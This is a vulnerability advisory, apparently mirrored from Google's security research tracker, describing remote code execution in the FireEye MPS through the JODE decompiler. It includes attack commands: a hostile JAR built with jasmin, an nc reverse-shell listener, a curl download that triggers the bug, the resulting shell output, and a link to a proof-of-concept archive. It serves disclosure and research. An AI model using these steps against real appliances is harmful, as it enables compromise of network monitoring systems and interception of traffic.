@@ -1,0 +1,70 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=666
+
+The FireEye MPS (Malware Protection System) is vulnerable to a remote code execution vulnerability, simply from monitoring hostile traffic. FireEye is designed to operate as a passive network tap, so that it can see all the files and emails that enter a monitored network.
+
+This vulnerability allows an attacker to compromise the FireEye device, get a root shell and start monitoring all traffic on the victim network (emails, attachments, downloads, web browsing, etc). This is about the worst possible vulnerability that you can imagine for a FireEye user, it literally does not get worse than this.
+
+This bug is in one of the analysis tools used by the MIP (Malware Input Processor), which has various tools for analysis of different file types. One of these tools is a script that attempts to decompile Java Archives, then runs some simple regexes over the decompiled code:
+
+$ grep subprocess.Popen /opt/fireeye/scripts/mip/content/jar.py
+			sp = subprocess.Popen(yara_cmd,stdout=outfile)
+                        sp = subprocess.Popen(cmd_list,stdout=outfile,stderr=errfile)
+                        sp = subprocess.Popen(jarsigner_cmd,stdout=outfile,stderr=errfile)
+
+The decompiler used is actually a modified version of JODE, an ancient opensource decompiler written in Java:
+
+http://jode.sourceforge.net/
+
+Examining the source code for JODE, it supports a "String Deobfuscation" feature that relies on reflection, this is visible here:
+
+
+http://sourceforge.net/p/jode/code/HEAD/tree/trunk/jode/src/net/sf/jode/expr/InvokeOperator.java
+
+	public Object invokeMethod(Reference ref, boolean isVirtual, 
+				   Object cls, Object[] params) 
+	    throws InterpreterException, InvocationTargetException {
+	    if (cls == null && ref.getClazz().equals(classSig)) {
+		BasicBlocks bb = classInfo
+		    .findMethod(ref.getName(), ref.getType())
+		    .getBasicBlocks();
+		if (bb != null)
+		    return interpreter.interpretMethod(bb, null, params); 
+		throw new InterpreterException
+		    ("Can't interpret static native method: "+ref);
+	    } else
+		return super.invokeMethod(ref, isVirtual, cls, params);
+	}
+    }
+
+By carefully crafting a class file that passes JODE's test for obfuscation, we were able to invoke arbitrary methods using reflection. We did this using the jasmin compiler:
+
+
+# create the hostile JAR
+$ jasmin ReverseShell.j 
+$ jar cvf fireeye.jar ReverseShell.class 
+added manifest
+adding: ReverseShell.class(in = 489) (out= 311)(deflated 36%)
+
+# Now start a reverse shell listening
+$ nc -lp 9090 &
+[1] 11115
+
+# download a file over the monitored network
+$ curl http://192.168.1.1/appliance-test/fireeye.jar &> /dev/null
+
+# wait for the connect back shell attempt
+$ wait
+uid=821(mip) gid=3111(mip)
+groups=3111(mip),602(antivirus),2000(analysis),3001(stats),3134(mip_child),3200(dipcshm),3203(reports),3204(contents),3210(mip_client)
+[1]+  Done                    nc -lp 9090
+
+# Code execution!
+
+(Getting root from gid=mip_child is trivial, this is a second bug that will be filed.)
+
+The Jasmin file  we used is attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39007.zip
+
